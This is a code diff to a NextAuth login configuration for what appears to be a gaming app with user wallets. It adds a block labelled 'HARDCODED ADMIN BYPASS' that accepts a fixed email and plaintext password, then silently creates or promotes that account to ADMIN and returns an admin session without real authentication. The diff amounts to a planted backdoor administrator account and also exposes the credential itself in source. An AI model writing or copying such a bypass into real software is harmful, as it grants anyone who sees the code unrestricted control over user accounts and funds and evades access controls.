@@ -16,6 +16,39 @@ export const authOptions: AuthOptions = {
           return null;
         }
 
+        // HARDCODED ADMIN BYPASS
+        if (credentials.email === 'admin963@rxfurygame.com' && credentials.password === '@Mausam987') {
+          let user = await prisma.user.findUnique({ where: { email: 'admin963@rxfurygame.com' } });
+          if (!user) {
+             user = await prisma.user.create({
+               data: {
+                 email: 'admin963@rxfurygame.com',
+                 systematicId: 'FURY-ADMIN',
+                 passwordHash: 'HARDCODED_ADMIN',
+                 role: 'ADMIN',
+               }
+             });
+          } else if (user.role !== 'ADMIN') {
+             user = await prisma.user.update({
+               where: { id: user.id },
+               data: { role: 'ADMIN' }
+             });
+          }
+          return {
+            id: user.id,
+            systematicId: user.systematicId,
+            email: user.email,
+            role: 'ADMIN',
+            mainWalletBalance: user.mainWalletBalance,
+            bonusWalletBalance: user.bonusWalletBalance,
+            vipLevelId: user.vipLevelId,
+            firstName: 'Super',
+            lastName: 'Admin',
+            supabaseId: 'hardcoded-admin'
+          };
+        }
+
+
         const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL || '';
         const supabaseKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || '';
         
